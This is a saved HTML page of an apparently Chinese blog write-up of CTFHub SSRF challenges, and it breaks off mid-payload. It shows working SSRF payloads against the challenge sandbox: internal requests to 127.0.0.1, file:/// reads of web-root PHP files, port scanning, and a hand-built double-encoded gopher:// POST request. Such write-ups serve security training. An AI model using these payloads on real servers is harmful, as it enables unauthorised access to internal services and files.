@@ -1,0 +1,1695 @@
+<!DOCTYPE html>
+<!-- saved from url=(0045)https://www.cnblogs.com/R3col/p/14122684.html -->
+<html lang="zh-cn" style="--olcb-folder-code-block-max-height: 80vh; --cnb-code-bg: rgb(245, 245, 245); --cnb-code-font-size: 12px; --cnb-code-color: rgb(68, 68, 68);"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="never">
+    <meta name="description" content="SSRF 1.内网访问 题目描述 尝试访问位于127.0.0.1的flag.php吧 解题过程 打开题目，url为http://challenge-54ab013865ee24e6.sandbox.ctfhub.com:10080/?url=_ 推测可以通过参数url访问内网 直接访问?url=ht">
+    <meta property="og:description" content="SSRF 1.内网访问 题目描述 尝试访问位于127.0.0.1的flag.php吧 解题过程 打开题目，url为http://challenge-54ab013865ee24e6.sandbox.ctfhub.com:10080/?url=_ 推测可以通过参数url访问内网 直接访问?url=ht">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>(oﾟvﾟ)ノ Hi - CTFHub-技能树-SSRF</title>
+    <link id="favicon" rel="shortcut icon" href="https://common.cnblogs.com/favicon.svg" type="image/svg+xml">
+    
+    <style>#home :not(.cnblogs_code):not(.cnblogs_Highlighter)>pre:not([highlighted]):not([class*="brush:"]) code:not(.hljs), :not(.cnblogs_code):not(.cnblogs_Highlighter)>pre:not([highlighted]):not([class*="brush:"]) code:not(.hljs) {background: rgb(245, 245, 245);
+        padding: 12px;
+        border: 0.8px solid rgb(204, 204, 204);
+        border-radius: 3px;
+        border-color: transparent;
+        color: rgb(68, 68, 68);
+        font-family: "Courier New", sans-serif;
+        font-size: 12px</style><link rel="stylesheet" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/blog-common.min.css">
+    
+
+    
+        <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/cnblogs.css">
+    <link type="text/css" rel="stylesheet" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/custom.css">
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/bundle-simplememory-mobile-pure.min.css">
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/R3col/rss">
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/R3col/rsd.xml">
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/R3col/wlwmanifest.xml">
+    <script>
+        var currentBlogId = 584258;
+        var currentBlogApp = 'R3col';
+        var isLogined = false;
+        var isBlogOwner = false;
+        var skinName = 'SimpleMemory';
+        var visitorUserId = '';
+        var hasCustomScript = true;
+        try {
+            if (hasCustomScript && document.referrer && document.referrer.indexOf('baidu.com') >= 0) {
+                Object.defineProperty(document, 'referrer', { value: '' });
+                Object.defineProperty(Document.prototype, 'referrer', { get: function () { return ''; } });
+            }
+        } catch (error) { }
+        window.cb_enable_mathjax = false;
+        window.mathEngine = 0;
+        window.codeHighlightEngine = 1;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'cnblogs';
+        window.darkModeCodeHighlightTheme = 'vs2015';
+        window.isDarkCodeHighlightTheme = false;
+        window.isDarkModeCodeHighlightThemeDark = true;
+        window.isDisableCodeHighlighter = false;
+        window.enableCodeThemeTypeFollowSystem = false;
+        window.enableMacStyleCodeBlock = false
+    </script>
+        <script>
+            var currentPostDateAdded = '2020-12-11 20:54';
+        </script>
+    <script src="./CTFHub-技能树-SSRF - R3col - 博客园_files/jquery-2.2.0.min.js.下载"></script>
+    <script src="./CTFHub-技能树-SSRF - R3col - 博客园_files/blog-common.min.js.下载"></script><style>.medium-zoom-overlay {
+  position: fixed;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  opacity: 0;
+  transition: opacity 300ms;
+  will-change: opacity;
+}
+
+.medium-zoom--opened .medium-zoom-overlay {
+  cursor: pointer;
+  cursor: zoom-out;
+  opacity: 1;
+}
+
+.medium-zoom-image {
+  cursor: pointer;
+  cursor: zoom-in;
+  /*
+    The `transition` is marked as "!important" for the animation to happen
+    even though it's overriden by another inline `transition` style attribute.
+
+    This is problematic with frameworks that generate inline styles on their
+    images (e.g. Gatsby).
+
+    See https://github.com/francoischalifour/medium-zoom/issues/110
+   */
+  transition: transform 300ms cubic-bezier(0.2, 0, 0.2, 1) !important;
+}
+
+.medium-zoom-image--hidden {
+  visibility: hidden;
+}
+
+.medium-zoom-image--opened {
+  position: relative;
+  cursor: pointer;
+  cursor: zoom-out;
+  will-change: transform;
+}
+</style><script id="hljs-script" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/highlight.min.js.下载" type="text/javascript" async=""></script>
+    
+
+    
+<script id="hljs-language-http" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/http.min.js.下载" type="text/javascript" async=""></script><link rel="stylesheet" type="text/css" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/page-common-comArticle.b054622b.css"><link rel="stylesheet" type="text/css" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/page-article.b054622b.css"><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style><link rel="stylesheet" type="text/css" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/comBefore.b054622b.css"><link rel="stylesheet" type="text/css" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/fonticon.b054622b.css"><link rel="stylesheet" type="text/css" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/google-fonts.b054622b.css"></head>
+<body class="skin-simplememory no-navbar hljs-engine" style="overflow: auto;" data-bs-spy="scroll" data-bs-target="#articleDirectory" data-bs-offset="0" tabindex="0"><div id="dayNightSwitch" class="generalWrapper"> <div class="onOff daySwitch"> <div class="star star1"></div> <div class="star star2"></div> <div class="star star3"></div> <div class="star star4"></div> <div class="star star5"></div> <div class="star sky"></div> <div class="sunMoon"> <div class="crater crater1"></div> <div class="crater crater2"></div> <div class="crater crater3"></div> <div class="cloud part1"></div> <div class="cloud part2"></div> </div> </div> </div>
+    <a name="top" style="display: none;"></a>
+    <div id="top_nav" class="navbar forpc navbar-custom">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
+                        <img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/logo.svg" alt="博客园Logo">
+                    </a>
+                </li>
+                <li>
+                    <a href="https://www.cnblogs.com/" onclick="countClicks(&#39;skin-navbar-sitehome&#39;)">首页</a>
+                </li>
+                <li>
+                    <a href="https://news.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-news&#39;)">新闻</a>
+                </li>
+                <li>
+                    <a href="https://q.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-q&#39;)">博问</a>
+                </li>
+                    <li><a href="https://www.cnblogs.com/cmt/p/17489281.html">直播</a></li>
+                <li>
+                    <a href="https://ing.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-ing&#39;)">闪存</a>
+                </li>
+                <li>
+                    <a href="https://edu.cnblogs.com/" onclick="countClicks(&#39;nav&#39;, &#39;skin-navbar-edu&#39;)">班级</a>
+                </li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off">
+                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
+                            <img id="search_icon" class="focus-hidden" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/search.svg" alt="搜索">
+                            <img class="hidden focus-visible" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/enter.svg" alt="搜索">
+                        </button>
+                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
+                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById(&#39;zzk_search_input&#39;).value)">
+                                <div class="keyword-wrapper">
+                                    <img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/search.svg" alt="搜索">
+                                    <div class="keyword"></div>
+                                </div>
+                                <span class="search-area">所有博客</span>
+                            </li>
+                                    <li tabindex="1" onclick="zzkBlogSearch(event, &#39;R3col&#39;, document.getElementById(&#39;zzk_search_input&#39;).value)">
+                                        <div class="keyword-wrapper">
+                                            <img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/search.svg" alt="搜索">
+                                            <div class="keyword"></div>
+                                        </div>
+                                        <span class="search-area">当前博客</span>
+                                    </li>
+                        </ul>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔" style="display: none;">
+                        <img id="new_post_icon" class="navbar-icon" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/newpost.svg" alt="写随笔">
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客" style="display: none;">
+                        <img id="myblog_icon" class="navbar-icon" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/myblog.svg" alt="我的博客">
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息" style="display: none;">
+                        <img id="msg_icon" class="navbar-icon" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/message.svg" alt="短消息">
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
+                        <img class="navbar-icon" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/lite-mode-on.svg" alt="简洁模式">
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown" style="display: none;">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/avatar-default.svg" alt="用户头像">
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <img id="navbar_lite_mode_on" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/lite-mode-check.svg" class="hide" style="display: none;"><span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup" style="display: inline;">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()" style="display: inline;">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    
+
+    <!--done-->
+<div id="home" style="margin-top: 246px;">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/R3col/"><img id="blogLogo" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/logo.gif" alt="返回主页"></a>		
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/R3col/">r3col</a>
+</h1>
+<h2></h2>
+
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/R3col/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/R3col">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/R3col/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<span id="stats_post_count">随笔 - 89&nbsp; </span>
+<span id="stats_article_count">文章 - 0&nbsp; </span>
+<span id="stats-comment_count">评论 - 6&nbsp; </span>
+<span id="stats-total-view-count">阅读 - 
+<span title="总阅读数: 48038">
+48038</span></span>
+
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    <!--done-->
+    <div id="topics">
+        <div class="post">
+            <h1 class="postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2 vertical-middle post-del-title" href="https://www.cnblogs.com/R3col/p/14122684.html">
+    <span role="heading" aria-level="2">CTFHub-技能树-SSRF</span>
+    
+
+</a><button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body">
+<h1 id="ssrf" tid="tid-KniWTX">SSRF<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h1>
+<p></p><div class="toc"><div class="toc-container-header">目录</div><ul><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#ssrf" rel="noopener">SSRF</a><ul><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-r3ebjm" rel="noopener">1.内网访问</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-p5jaAH" rel="noopener">2.伪协议读取文件</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-3cB78n" rel="noopener">3.端口扫描</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-kZCMBY" rel="noopener">4.POST请求</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-aRy7dn" rel="noopener">5.上传文件</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-nDncbf" rel="noopener">6.FastCGI协议</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-ZFsxpH" rel="noopener">7.Redis</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-b86mf5" rel="noopener">8.URL Bypass</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-S7PkWb" rel="noopener">9.数字IP Bypass</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-ET45zm" rel="noopener">10.302跳转 Bypass</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-ZiYXNk" rel="noopener">11.DNS重绑定 Bypass</a></li></ul></li></ul></div><p></p>
+<h2 id="tid-r3ebjm" tid="tid-r3ebjm">1.内网访问<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>尝试访问位于<code>127.0.0.1</code>的flag.php吧</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>打开题目，url为<code>http://challenge-54ab013865ee24e6.sandbox.ctfhub.com:10080/?url=_</code></p>
+<p>推测可以通过参数url访问内网</p>
+<p>直接访问<code>?url=http://127.0.0.1/flag.php</code>即可</p>
+</li>
+</ul>
+<h2 id="tid-p5jaAH" tid="tid-p5jaAH">2.伪协议读取文件<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>尝试去读取一下Web目录下的flag.php吧</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>url为<code>http://challenge-cc86fd87db00a898.sandbox.ctfhub.com:10080/?url=_</code></p>
+<p>直接访问<code>?url=http://127.0.0.1/flag.php</code>，没有flag，根据题目描述，应该在源码中，改用ssrf的伪协议读取</p>
+<p><code>?url=file:///var/www/html/flag.php</code>即可</p>
+</li>
+</ul>
+<h2 id="tid-3cB78n" tid="tid-3cB78n">3.端口扫描<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>访问<code>?url=http://127.0.0.1:8000</code>，burp抓包，intruder端口爆破</p>
+<p><a data-fancybox="gallery" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/1706496-20201211205219147-2068314501.png"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/1706496-20201211205219147-2068314501.png"></a></p>
+</li>
+</ul>
+<h2 id="tid-kZCMBY" tid="tid-kZCMBY">4.POST请求<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.我准备了一个302.php,可能对你有用哦</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>访问<code>?url=http://127.0.0.1/302.php</code></p>
+<code-box id="code-khH6EG"><button boxid="code-khH6EG" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-khH6EG pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-php" highlighted="true" boxid="code-khH6EG" style="background: rgb(245, 245, 250);"><code class="language-php highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>])){
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: <span class="hljs-subst">{$_GET['url']}</span>"</span>);
+    <span class="hljs-keyword">exit</span>;
+}
+
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+</code></pre></code-box>
+<p>访问<code>?url=file:///var/www/html/index.php</code></p>
+<code-box id="code-QQZrRW"><button boxid="code-QQZrRW" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-QQZrRW pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-php" highlighted="true" boxid="code-QQZrRW" style="background: rgb(245, 245, 250);"><code class="language-php highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+
+<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Help: here is 302.php"</span>);
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>])){
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: /?url=_"</span>);
+    <span class="hljs-keyword">exit</span>;
+}
+
+<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
+<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>]);
+<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);
+<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
+<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
+&gt;
+</code></pre></code-box>
+<p>访问<code>?url=file:///var/www/html/flag.php</code></p>
+<code-box id="code-EYNbwG"><button boxid="code-EYNbwG" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-EYNbwG pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-php" highlighted="true" boxid="code-EYNbwG" style="background: rgb(245, 245, 250);"><code class="language-php highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>] != <span class="hljs-string">"127.0.0.1"</span>){
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Just View From 127.0.0.1"</span>;
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-variable">$flag</span>=<span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">"CTFHUB"</span>);
+<span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"key"</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">"key"</span>] == <span class="hljs-variable">$key</span>){
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
+    <span class="hljs-keyword">exit</span>;
+}
+<span class="hljs-meta">?&gt;</span>
+</code></pre></code-box>
+<p>访问<code>?url=http://127.0.0.1/flag.php</code></p>
+<code-box id="code-Jm3wY6"><button boxid="code-Jm3wY6" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-Jm3wY6 pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-html" highlighted="true" boxid="code-Jm3wY6" style="background: rgb(245, 245, 250);"><code class="language-html highlighter-hljs hljs language-xml" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/flag.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"key"</span>&gt;</span>
+<span class="hljs-comment">&lt;!-- De<span class="hljs-doctag">bug:</span> key=5e37e6b3f645b286834aabb8a49dac71--&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+</code></pre></code-box>
+<p>现在拿到了key，只需要构造POST请求，把key提交给<code>flag.php</code>页面即可</p>
+<p>（这个过程自己把自己坑了一把）</p>
+<p>ssrf中可以使用<code>gopher</code>协议来构造post请求，具体格式：</p>
+<p><code>gopher://ip:port/_METHOD /file HTTP/1.1 http-header&amp;body</code></p>
+<p>构造请求包：</p>
+<p>！注意<code>Content-Length</code>和<code>Content-Type</code>，可以直接访问页面提交数据，用burp抓包再修改Host</p>
+<code-box id="code-ZdnPYB"><button boxid="code-ZdnPYB" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-ZdnPYB pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-http" highlighted="true" boxid="code-ZdnPYB" style="background: rgb(245, 245, 250);"><code class="language-http highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>36
+
+<span class="language-ini"><span class="hljs-attr">key</span>=<span class="hljs-number">5</span>e37e6b3f645b286834aabb8a49dac71
+</span></code></pre></code-box>
+<p>HTTP版本之前编码一次，之后部分URL编码 两次：</p>
+<p>！注意，换行符是<code>%0d%0a</code></p>
+<code-box id="code-BnGPaf"><button boxid="code-BnGPaf" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-BnGPaf pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs" highlighted="true" boxid="code-BnGPaf" style="background: rgb(245, 245, 250);"><code class="highlighter-hljs hljs language-perl" style="background: none; border: 0px; border-radius: 0px; padding: 0px;">POST%20/flag.php%20HTTP/<span class="hljs-number">1.1</span>%250d%250aHost%<span class="hljs-number">3</span>A%20127.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%250d%250aUser-Agent%<span class="hljs-number">3</span>A%20curl%250d%250aAccept%<span class="hljs-number">3</span>A%2<span class="hljs-number">0</span>%2A/%<span class="hljs-number">2</span>A%250d%250aContent-Type%<span class="hljs-number">3</span>A%20application/<span class="hljs-keyword">x</span>-www-form-urlencoded%250d%250aContent-Length%<span class="hljs-number">3</span>A%2036%250d%250a%250d%250akey%3D5e37e6b3f645b286834aabb8a49dac71
+</code></pre></code-box>
+<p>拼接payload：</p>
+<code-box id="code-JwbSCc"><button boxid="code-JwbSCc" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-JwbSCc pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs" highlighted="true" boxid="code-JwbSCc" style="background: rgb(245, 245, 250);"><code class="highlighter-hljs hljs language-perl" style="background: none; border: 0px; border-radius: 0px; padding: 0px;">?url=gopher:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">80</span>/_POST%20/flag.php%20HTTP/<span class="hljs-number">1.1</span>%250d%250aHost%<span class="hljs-number">3</span>A%20127.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%250d%250aUser-Agent%<span class="hljs-number">3</span>A%20curl%250d%250aAccept%<span class="hljs-number">3</span>A%2<span class="hljs-number">0</span>%2A/%<span class="hljs-number">2</span>A%250d%250aContent-Type%<span class="hljs-number">3</span>A%20application/<span 